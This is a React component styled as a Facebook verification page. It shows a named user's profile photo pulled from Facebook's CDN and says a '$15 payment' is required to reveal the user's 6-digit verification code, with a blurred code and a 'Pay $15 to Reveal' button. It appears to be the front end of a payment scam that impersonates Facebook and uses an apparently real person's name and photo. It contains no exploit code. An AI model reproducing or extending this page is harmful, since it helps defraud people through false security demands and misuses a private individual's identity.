'use client';

export default function SixDigit() {
    const code = '******';

    const fbUser = {
        name: 'Sanjida Mim',
        profilePic:
            'https://scontent.frjh7-1.fna.fbcdn.net/v/t1.6435-9/36795511_117304302517433_2255713804497190912_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeGQ0TyHWrYJpNHXasnPebu2YHNYsNC5a8xgc1iw0LlrzCUJrFXqJLL0wo-URWLCVQ70kHnpu3U1rVWd1ITTLtZk&_nc_ohc=xiBHGY_rNr0Q7kNvwFo8iRW&_nc_oc=AdkoIO7kr4Ny-vTpfh9fBDHA8YloPqg56m8uNvIxzf_OBoXWC-AsA5OB7cpJ4_1-AnkDUEDQmKO4pr7py107W5_F&_nc_zt=23&_nc_ht=scontent.frjh7-1.fna&_nc_gid=Yby6jWOAxYt-0Bh4xJNqBw&oh=00_AfOqfkoySiaVLjjOgw1EJMS5xor-w3Y_kTYi9eAm9IMLSQ&oe=687B5270',
    };

    return (
        <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4 py-10 font-sans">
            <div className="max-w-md w-full">
                <div className="flex items-center gap-4 mb-6">
                    <img
                        src={fbUser.profilePic}
                        alt="Profile"
                        className="w-16 h-16 rounded-full border-4 border-[#1877f2] object-cover"
                    />
                    <div>
                        <p className="text-sm text-gray-600">Facebook User</p>
                        <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
                    </div>
                </div>

                <h1 className="text-2xl font-semibold text-gray-900 mb-2">
                    Unlock Your Verification Code
                </h1>
                <p className="text-gray-700 text-sm mb-6">
                    A $15 payment is required to access your secure 6-digit verification code.
                </p>

                <div className="mb-6">
                    <img
                        className="rounded-md w-full"
                        src="https://web.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png"
                        alt="2FA Illustration"
                    />
                </div>

                <div className="flex justify-between gap-2 mb-6">
                    {code.split('').map((digit, idx) => (
                        <div
                            key={idx}
                            className="w-12 h-14 border border-gray-300 rounded-lg flex items-center justify-center text-2xl font-semibold tracking-wider text-[#155fca]"
                        >
                            <span className="blur-sm select-none">{digit}</span>
                        </div>
                    ))}
                </div>

                <button className="w-full bg-[#1877f2] text-white font-medium py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition">
                    Pay $15 to Reveal 6-Digit Code
                </button>


            </div>
        </div>
    );
}
